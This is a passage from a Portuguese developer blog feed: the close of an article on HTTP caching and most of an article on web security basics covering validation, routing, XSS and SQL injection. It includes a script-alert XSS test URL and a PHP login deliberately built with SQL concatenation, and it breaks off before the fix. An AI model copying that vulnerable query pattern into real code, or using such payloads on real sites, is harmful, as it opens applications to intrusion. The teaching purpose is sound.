&lt;p&gt;Em documentos &lt;em&gt;HTML&lt;/em&gt; onde o conteúdo é atualizado com uma frequência
indeterminada, o uso de &lt;code&gt;Last-Modified&lt;/code&gt; ou &lt;code&gt;ETag&lt;/code&gt; é mais apropriado.
Uma vez que fica difícil determinar quando a atualização irá ocorrer, é
uma boa estratégia fazer com que o navegador atualize o conteúdo do seu
&lt;em&gt;cache&lt;/em&gt; quando necessário.&lt;/p&gt;
&lt;h2&gt;Considerações Finais&lt;/h2&gt;
&lt;p&gt;Embora seja um conteúdo bem introdutório, acho fundamental sabermos as
diferentes maneiras de aplicar &lt;em&gt;cache&lt;/em&gt; com o protocolo &lt;em&gt;HTTP&lt;/em&gt; antes de
partirmos para soluções específicas. Essas recomendações não são
infalíveis, e em um cenário mais “extremo”, necessitam sim de auxílio de
algumas ferramentas disponíveis no mercado para tornar o &lt;em&gt;cache&lt;/em&gt;
eficiente tanto para a experiência do usuário, quanto para a
estabilidade dos seus serviços.&lt;/p&gt;
&lt;p&gt;Embora eu tenha utilizado o navegador &lt;em&gt;Web&lt;/em&gt; como foco das explicações,
“robôs”, ferramentas de &lt;em&gt;proxy&lt;/em&gt; e &lt;em&gt;gateways&lt;/em&gt; também podem fazer controle
de &lt;em&gt;cache&lt;/em&gt;. O comportamento é basicamente o mesmo, variando de acordo
com instruções passadas no cabeçalho &lt;code&gt;Cache-Control&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Como não sou nenhum “expert” no assunto, se você possui alguma sugestão
ou correção sobre o uso de &lt;em&gt;cache&lt;/em&gt; com &lt;em&gt;HTTP&lt;/em&gt;, por favor, conte-nos
através dos comentários abaixo.&lt;/p&gt;
&lt;p&gt;Até a próxima…&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.askapache.com/htaccess/apache-speed-compression.html" title="Material bem interessante sobre como melhorar a performance com Cache no Apache"&gt;&lt;em&gt;Ask Apache: Speed tips – Turn on Compressor&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://betterexplained.com/articles/how-to-optimize-your-site-with-http-caching/" title="Excelente artigo falando sobre HTTP e cache"&gt;&lt;em&gt;Better Explained: How To Optimize Your Site With HTTP Caching&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.djangoproject.com/en/dev/topics/cache/" title="Leia mais sobre Cache no Django"&gt;&lt;em&gt;Django Documentation: Django’s cache framework&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://developers.google.com/speed/articles/caching" title="Bom material do Google sobre Caching"&gt;&lt;em&gt;Google Developers: HTTP Caching&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://condor.depaul.edu/dmumaugh/readings/handouts/SE435/HTTP/http.html" title="Conheça um pouco mais sobre o protocolo HTTP com este artigo científico"&gt;&lt;em&gt;John Yannakopoulos: HyperText Transfer Protocol – A Short Course&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.mnot.net/cache_docs/" title="Excelente conteúdo sobre caching HTTP"&gt;&lt;em&gt;mnot.net: Caching Tutorial&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.webscalingblog.com/performance/caching-http-headers-cache-control-max-age.html" title="Artigo bem objetivo descrevendo o uso do max-age"&gt;&lt;em&gt;Web Scaling Blog: Caching HTTP Headers, Cache-Control: max-age&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="desenvolvimento"></category><category term="web"></category><category term="infraestrutura"></category><category term="cache"></category><category term="http"></category></entry><entry><title>Problemas comuns de segurança em aplicações Web</title><link href="https://klauslaube.com.br/2012/04/15/problemas-de-seguranca-em-aplicacoes-web.html" rel="alternate"></link><published>2012-04-15T18:03:48-03:00</published><updated>2012-04-15T18:03:48-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2012-04-15:/2012/04/15/problemas-de-seguranca-em-aplicacoes-web.html</id><summary type="html">&lt;p&gt;Seria perfeito se o mundo fosse feito apenas de pessoas
bem-intencionadas. Acontece que é mais fácil os alienígenas exterminarem
a raça humana, do que o homem deixar de tirar proveito de alguma
situação.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Quando estamos desenvolvendo nossas aplicações &lt;a href="https://klauslaube.com.br/tag/web.html" title="Leia mais sobre Web"&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt;, temos que
“pensar” como um usuário mal-intencionado. Não somente para garantir …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Seria perfeito se o mundo fosse feito apenas de pessoas
bem-intencionadas. Acontece que é mais fácil os alienígenas exterminarem
a raça humana, do que o homem deixar de tirar proveito de alguma
situação.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Quando estamos desenvolvendo nossas aplicações &lt;a href="https://klauslaube.com.br/tag/web.html" title="Leia mais sobre Web"&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt;, temos que
“pensar” como um usuário mal-intencionado. Não somente para garantir o
bom funcionamento da mesma, mas também para garantir a segurança e
bem-estar dos “usuários civis” que consomem os nossos serviços.&lt;/p&gt;
&lt;p&gt;Vamos explorar alguns problemas relacionados a segurança, e mostrar como
solucioná-los de forma simples e prática.&lt;/p&gt;
&lt;h2&gt;Use frameworks!&lt;/h2&gt;
&lt;p&gt;E esta é a minha primeira dica para você: use &lt;em&gt;frameworks&lt;/em&gt; sempre que
possível!&lt;/p&gt;
&lt;p&gt;Eles já possuem um conjunto de ferramentas que contornam problemas como
&lt;em&gt;SQL Injection&lt;/em&gt;, &lt;em&gt;XSS&lt;/em&gt; e &lt;em&gt;CSRF&lt;/em&gt;. Pessoas muito inteligentes já pensaram no
problema e já solucionaram para você. Na maioria dos casos, mais de uma vez!&lt;/p&gt;
&lt;p&gt;Em alguns &lt;em&gt;frameworks&lt;/em&gt;, como o &lt;a href="https://klauslaube.com.br/tag/django.html" title="Leia mais sobre Django"&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt; e &lt;a href="https://klauslaube.com.br/tag/codeigniter.html" title="Leia mais sobre Codeigniter"&gt;&lt;em&gt;Codeigniter&lt;/em&gt;&lt;/a&gt;, essas
ferramentas são quase “transparentes”, ou seja, você tem pouco (ou
nenhum) trabalho para utilizá-las no cotidiano.&lt;/p&gt;
&lt;p&gt;Já trabalhei por muito tempo com “desenvolvimento from scratch”, e hoje
posso apontar vários pontos de falhas em aplicações que produzi no
passado. Os &lt;em&gt;frameworks&lt;/em&gt; diminuem muito estes pontos, por isso vale a
pena o seu uso.&lt;/p&gt;
&lt;h2&gt;Validações (nunca confie no usuário)&lt;/h2&gt;
&lt;p&gt;Como eu comecei com o &lt;a href="https://klauslaube.com.br/tag/php.html" title="Leia mais sobre PHP"&gt;&lt;em&gt;PHP&lt;/em&gt;&lt;/a&gt;, sei muito bem que este é um problema
comum em aplicações desenvolvidas por iniciantes.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Nunca confie no usuário&lt;/strong&gt;, e principalmente &lt;strong&gt;nunca confie em
validações realizadas pelo &lt;a href="https://klauslaube.com.br/tag/javascript.html" title="Leia mais sobre Javascript"&gt;&lt;em&gt;Javascript&lt;/em&gt;&lt;/a&gt;&lt;/strong&gt;. Todo ponto de entrada de
informação deve possuir uma validação no &lt;em&gt;server-side&lt;/em&gt;, mesmo que exista
uma validação no &lt;em&gt;client-side&lt;/em&gt;. &lt;strong&gt;Lembre-se:&lt;/strong&gt; Existem navegadores que
não utilizam &lt;em&gt;Javascript&lt;/em&gt;, e mesmo os que utilizam, permitem que o
usuário desabilite esta função.&lt;/p&gt;
&lt;p&gt;No &lt;em&gt;Django&lt;/em&gt;, podemos fazer validações de formulários através de
&lt;a href="https://docs.djangoproject.com/en/dev/topics/forms/" title="Conheça os Forms no Django"&gt;&lt;em&gt;Forms&lt;/em&gt;&lt;/a&gt;. No &lt;em&gt;Codeigniter&lt;/em&gt; fazemos através da &lt;a href="http://codeigniter.com/user_guide/libraries/form_validation.html" title="Veja como fazer validações de formulário no Codeigniter"&gt;&lt;em&gt;Form Validation Class&lt;/em&gt;&lt;/a&gt;.
Em &lt;em&gt;PHP&lt;/em&gt; “puro”, podemos fazer validações através da &lt;a href="http://pear.php.net/manual/en/package.validate.validate.intro.php" title="Instale a Validate através da PEAR"&gt;biblioteca &lt;em&gt;Validate&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;As ferramentas citadas acima são extremamente eficientes para ações
realizadas via &lt;em&gt;POST&lt;/em&gt;. Mas e quando temos parâmetros vindos da &lt;em&gt;URL&lt;/em&gt;,
através do método &lt;em&gt;GET&lt;/em&gt;, qual é a melhor maneira de agirmos?&lt;/p&gt;
&lt;h3&gt;URLs seguras e amigáveis&lt;/h3&gt;
&lt;p&gt;Há um bom tempo que as “URLs amigáveis” deixaram de ser um diferencial
nas aplicações &lt;em&gt;web&lt;/em&gt; e tornaram-se item obrigatório. Além de trazer o
benefício do &lt;a href="http://pt.wikipedia.org/wiki/Otimiza%C3%A7%C3%A3o_para_motores_de_busca" title="Leia mais sobre SEO no Wikipedia"&gt;&lt;em&gt;SEO&lt;/em&gt;&lt;/a&gt;, elas podem ser uma grande aliada quando o
assunto é segurança.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;URLs&lt;/em&gt; que antes eram feitas dessa maneira:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/blog.php?year&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;2012&lt;/span&gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nv"&gt;month&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;12&lt;/span&gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nv"&gt;day&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;21&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Podem ser reproduzidas desta forma:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/blog/2012/12/21/
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;O mecanismo de rotas de alguns &lt;em&gt;frameworks&lt;/em&gt; permite a utilização de
expressões regulares na construção do caminho. Por exemplo, em &lt;em&gt;Django&lt;/em&gt;
temos o seguinte cenário:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# urls.py&lt;/span&gt;

&lt;span class="n"&gt;urlpatterns&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;patterns&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="o"&gt;...&lt;/span&gt;
    &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;r&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;^blog/(?P&amp;lt;year&amp;gt;\d{4})/(?P&amp;lt;month&amp;gt;[0-9]{2})/(?P&amp;lt;day&amp;gt;\d{2})/$&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;blog.views.index&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
    &lt;span class="o"&gt;...&lt;/span&gt;
&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Determinamos que a rota inicia-se por &lt;code&gt;blog&lt;/code&gt;, sendo composta por um
valor numérico de 4 dígitos que atende pelo identificador &lt;code&gt;year&lt;/code&gt;,
outro valor de dois dígitos, indo de 0 a 9, chamado &lt;code&gt;month&lt;/code&gt;, e o
último um valor numérico de 2 dígitos chamado &lt;code&gt;day&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;A verificação é feita no momento da requisição. Se a rota informada
bater com o padrão criado, ele executa a &lt;em&gt;view&lt;/em&gt; &lt;code&gt;blog.views&lt;/code&gt;. Caso
contrário, se a rota não bater com nenhum padrão informado (por exemplo,
&lt;code&gt;/blog/2012/aa/21/&lt;/code&gt;), o usuário tomará um erro 404.&lt;/p&gt;
&lt;p&gt;Em nossa &lt;em&gt;view&lt;/em&gt;, resgataríamos esses valores da seguinte forma:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# blog/views.py&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;index&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;year&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;month&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;day&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="c1"&gt;# Lógica de renderização...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Simples assim! Temos um “input” de informação através de &lt;em&gt;GET&lt;/em&gt;, onde
temos certeza do seu tipo e tamanho.&lt;/p&gt;
&lt;p&gt;O mesmo resultado pode ser obtido com o &lt;em&gt;Codeigniter&lt;/em&gt;, basta adicionar a
expressão desejada em seu &lt;code&gt;application/config/routes.php&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="x"&gt;# application/config/routes.php&lt;/span&gt;

&lt;span class="x"&gt;$route[&amp;#39;blog/(\d{4})/([0-9]{2})/(\d{2})&amp;#39;] = &amp;quot;blog/index/$1/$2/$3&amp;quot;;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Aos invés de utilizarmos identificadores, utilizamos a ordem dos grupos
criados na expressão regular.&lt;/p&gt;
&lt;p&gt;Você não precisa utilizar um &lt;em&gt;framework&lt;/em&gt; para ter um esquema de rotas
como ilustrado acima. Um resultado parecido pode ser atingido através do
&lt;a href="https://klauslaube.com.br/tag/nginx.html" title="Leia mais sobre Nginx"&gt;&lt;em&gt;Nginx&lt;/em&gt;&lt;/a&gt; e do &lt;em&gt;Apache&lt;/em&gt; com &lt;em&gt;mod-rewrite&lt;/em&gt;. &lt;a href="http://stackoverflow.com/questions/812571/how-to-create-friendly-url-in-php" title="Como criar rotas para arquivos PHP com o Apache"&gt;Veja um exemplo de uso&lt;/a&gt;
apresentado numa &lt;em&gt;thread&lt;/em&gt; do &lt;em&gt;Stack Overflow&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;É claro que verificações mais complexas, como por exemplo, se o nome do
usuário informado na &lt;em&gt;URL&lt;/em&gt; é válido, necessitam de regras específicas,
muito provavelmente escritas dentro da &lt;em&gt;view&lt;/em&gt;. Um ponto de falha que
vale ressaltar é a criação de expressões regulares “genéricas”, que não
discriminam o tipo e tamanho dos valores informados.&lt;/p&gt;
&lt;h3&gt;Verificação de tipos de dados&lt;/h3&gt;
&lt;p&gt;Mas e quando não temos como fugir de um valor passado via &lt;em&gt;GET&lt;/em&gt;? Pode
acontecer! Por exemplo, em paginações (onde normalmente passamos um
valor &lt;code&gt;page&lt;/code&gt; como parâmetro), ou em uma busca (onde passamos o valor
pesquisado via &lt;em&gt;GET&lt;/em&gt;).&lt;/p&gt;
&lt;p&gt;Nesse caso, “forçamos” o tipo do dado informado, e diminuímos problemas
de interpretação do nosso código:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;

&lt;span class="nv"&gt;$page&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;isset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_GET&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;page&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nb"&gt;preg_match&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/^\d+$/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$_GET&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;page&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;?&lt;/span&gt; &lt;span class="nv"&gt;$_GET&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;page&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;A solução acima não é infalível, mas é uma maneira de diminuírmos a
incidência de erros. Se um valor diferente de inteiro positivo for
passado, a página a ser exibida será a primeira.&lt;/p&gt;
&lt;h2&gt;XSS – Cross-Site Scripting (não confie na informação)&lt;/h2&gt;
&lt;p&gt;É certo que, validando toda e qualquer
informação que a sua aplicação receber, você diminuirá muito a
ocorrência de problemas. Mas, mesmo confiando no tipo e nas dimensões da
informação, não podemos confiar no seu conteúdo.&lt;/p&gt;
&lt;p&gt;Imagine que você possua um &lt;em&gt;blog&lt;/em&gt;. Só você pode escrever artigos nele,
então você conhece o conteúdo da informação sendo produzida. Certo dia
você resolve que os usuários poderão comentar no seu &lt;em&gt;blog&lt;/em&gt;, e
desenvolve uma ferramenta de comentários com todas as validações citadas
anteriormente.&lt;/p&gt;
&lt;p&gt;Até que em certo momento, um usuário mal-intencionado &lt;strong&gt;escreve um
comentário&lt;/strong&gt; no seu &lt;em&gt;post&lt;/em&gt;, e neste comentário existe um &lt;strong&gt;&lt;em&gt;script&lt;/em&gt;&lt;/strong&gt;
&lt;em&gt;Javascript&lt;/em&gt; que explora uma &lt;strong&gt;falha de segurança&lt;/strong&gt; do &lt;em&gt;ActiveX&lt;/em&gt; (por
exemplo). Logo, todos os leitores que utilizam &lt;em&gt;Internet Explorer&lt;/em&gt; e
leram o seu &lt;em&gt;post&lt;/em&gt; são infectados por um &lt;em&gt;malware&lt;/em&gt; que o seu &lt;em&gt;blog&lt;/em&gt;
ajudou a proliferar.&lt;/p&gt;
&lt;p&gt;A injeção de um &lt;em&gt;script&lt;/em&gt; em um &lt;em&gt;website&lt;/em&gt;, através de campos de textos ou
passagem de parâmetros, é caracterizado como um ataque de &lt;strong&gt;&lt;em&gt;Cross-Site
Scripting&lt;/em&gt;&lt;/strong&gt; (ou &lt;em&gt;XSS&lt;/em&gt;).&lt;/p&gt;
&lt;p&gt;Uma maneira muito comum de evitar esse tipo de problema é simplesmente
“escapando” ou removendo elementos &lt;em&gt;HTML&lt;/em&gt; do conteúdo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class="c1"&gt;# xss.php&lt;/span&gt;

&lt;span class="nv"&gt;$var&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$_GET&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;var&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;

&lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nb"&gt;htmlspecialchars&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$var&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Acessar &lt;code&gt;xss.php&lt;/code&gt; com um &lt;code&gt;alert&lt;/code&gt; &lt;em&gt;Javascript&lt;/em&gt; como parâmetro, não
executará o comando, e sim apenas exibirá o conteúdo na tela, com os
caracteres que delimitam o elemento &lt;code&gt;script&lt;/code&gt; devidamente formatados:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;http://localhost/xss.php?var&lt;span class="o"&gt;=&lt;/span&gt;&amp;lt;script&amp;gt;alert&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;XSS!&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&amp;lt;/script&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Existem alguns &lt;a href="http://www.webdesignerdepot.com/2008/12/20-excellent-free-rich-text-editors/" title="Conheça 20 excelentes editores WYSIWYG"&gt;&lt;em&gt;Rich Text Editors&lt;/em&gt;&lt;/a&gt; que verificam e formatam o
conteúdo do campo antes de uma submissão. Mas &lt;strong&gt;lembre-se&lt;/strong&gt;! Editores
&lt;em&gt;WYSIWYG&lt;/em&gt; são basicamente &lt;em&gt;Javascript&lt;/em&gt;, logo, se eu desabilitar o
&lt;em&gt;Javascript&lt;/em&gt; do meu navegador, posso enviar &lt;em&gt;scripts&lt;/em&gt; maliciosos sem
impeditivo nenhum, por isso, é sempre necessário fazermos esse tipo de
validação no &lt;em&gt;server-side&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;O &lt;em&gt;Codeigniter&lt;/em&gt;, com a opção &lt;code&gt;$config['global_xss_filtering’]&lt;/code&gt; como
&lt;code&gt;TRUE&lt;/code&gt;, filtra automaticamente os dados resgatados de &lt;em&gt;GET&lt;/em&gt; ou &lt;em&gt;POST&lt;/em&gt;.
O que acho bacana desse filtro, é que ele previne apenas a injeção de
&lt;em&gt;scripts&lt;/em&gt; e atributos que podem de alguma forma prejudicar na segurança
da sua aplicação, não necessariamente formatando o conteúdo todo.&lt;/p&gt;
&lt;p&gt;Este tratamento está ativo por padrão no &lt;em&gt;engine&lt;/em&gt; de &lt;em&gt;templates&lt;/em&gt; do
&lt;em&gt;Django&lt;/em&gt;. Embora isso não impeça o armazenamento do &lt;em&gt;script&lt;/em&gt; no banco de
dados, impede que a sua renderização afete os usuários da sua aplicação.&lt;/p&gt;
&lt;p&gt;Uma outra forma muito bacana de prevenir este tipo de inconveniente é
utilizando uma linguagem de marcação alternativa, como &lt;em&gt;Textile&lt;/em&gt; e
&lt;em&gt;Markdown&lt;/em&gt;, em campos de textos abertos.&lt;/p&gt;
&lt;h2&gt;SQL Injection (não confie em sua aplicação)&lt;/h2&gt;
&lt;p&gt;Entre as vulnerabilidades citadas, acredito que o
&lt;strong&gt;&lt;em&gt;SQL Injection&lt;/em&gt;&lt;/strong&gt; é uma das mais
destrutivas, tanto para a sua aplicação, quanto para os seus usuários.&lt;/p&gt;
&lt;p&gt;Segundo o &lt;em&gt;Wikipedia&lt;/em&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;É um tipo de ameaça de segurança que se aproveita de falhas em
sistemas que interagem com bases de dados via SQL. A injeção de
SQL ocorre quando o atacante consegue inserir
uma série de instruções SQL dentro de uma
consulta (query) através da manipulação das entrada de dados de uma
aplicação.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Os resultados podem ser os mais desastrosos, como por exemplo, o acesso
de usuários não autorizados a áreas restritas, e o roubo de informações
da sua base de dados. Abaixo, uma autenticação simples, utilizando nome
de usuário e senha:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class="c1"&gt;# sql-injection.php&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;isset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;usuario&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nb"&gt;isset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;senha&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nv"&gt;$usuario&lt;/span&gt;    &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;usuario&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
    &lt;span class="nv"&gt;$senha&lt;/span&gt;      &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;senha&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;

    &lt;span class="c1"&gt;// Abre conexão com o banco de dados&lt;/span&gt;
    &lt;span class="nv"&gt;$link&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;mysql_connect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;root&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="c1"&gt;// Seleciona a base de dados&lt;/span&gt;
    &lt;span class="nb"&gt;mysql_select_db&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;exemplos_blog&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="c1"&gt;// Faz a consulta ao banco, comparando usuário e senha&lt;/span&gt;
    &lt;span class="nv"&gt;$query&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SELECT 1 FROM usuario WHERE usuario = &amp;#39;&lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="nv"&gt;$usuario&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;#39; &amp;quot;&lt;/span&gt;
        &lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;AND senha = &amp;#39;&lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="nv"&gt;$senha&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;#39;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nv"&gt;$result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;mysql_query&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$query&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;or&lt;/span&gt; &lt;span class="k"&gt;die&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Query inválida: &amp;quot;&lt;/span&gt;
        &lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="nb"&gt;mysql_error&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="nb"&gt;mysql_close&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$link&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

